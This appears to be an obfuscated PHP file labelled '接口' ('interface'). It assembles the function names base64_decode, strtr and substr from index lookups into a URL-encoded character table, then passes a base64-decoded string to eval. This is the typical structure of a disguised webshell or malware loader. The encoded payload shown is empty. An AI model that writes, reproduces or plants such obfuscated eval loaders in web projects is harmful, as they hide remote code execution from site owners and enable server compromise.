<?php /*接口*/ $FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$G2217f76dbb7c131cf9ecdd2981fc547d="HjgYVUEcxavKFJotNQIlZfbLAdRMGkOzSBhWmiprynTDuHesqPCw";$AGEcaCYORDiqMzgufoWFJLPNxrIjSybVkeBvpwsUhtnKXHZTAlmd=$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{3}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{6}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{33}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{30};$CgOHQWjcVeRbnavDSwZNuUlKpLfXIxskqBPArEMmThzYoJtFCiGy=$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{33}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{10}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{24}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{10}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{24};$DIyQYRGMTLKtjolfuzmHVAevEahWnXZcSrCdiJsBDNgqObUPwxkp=$CgOHQWjcVeRbnavDSwZNuUlKpLfXIxskqBPArEMmThzYoJtFCiGy{0}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{18}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{3}.$CgOHQWjcVeRbnavDSwZNuUlKpLfXIxskqBPArEMmThzYoJtFCiGy{0}.$CgOHQWjcVeRbnavDSwZNuUlKpLfXIxskqBPArEMmThzYoJtFCiGy{1}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{24};$ETayAvtLxmNognMCciRFJVUShuDbQBqdGlHejzpYsfOKEWZIkwrX=$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{7}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{13};$AGEcaCYORDiqMzgufoWFJLPNxrIjSybVkeBvpwsUhtnKXHZTAlmd.=$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{22}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{36}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{29}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{26}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{30}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{32}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{35}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{26}.$FbGFvDcHAClEjYytfZouUpNLaXQeMTKVmqROhkdSirJBgnWPxwzs{30};eval($AGEcaCYORDiqMzgufoWFJLPNxrIjSybVkeBvpwsUhtnKXHZTAlmd("")); ?>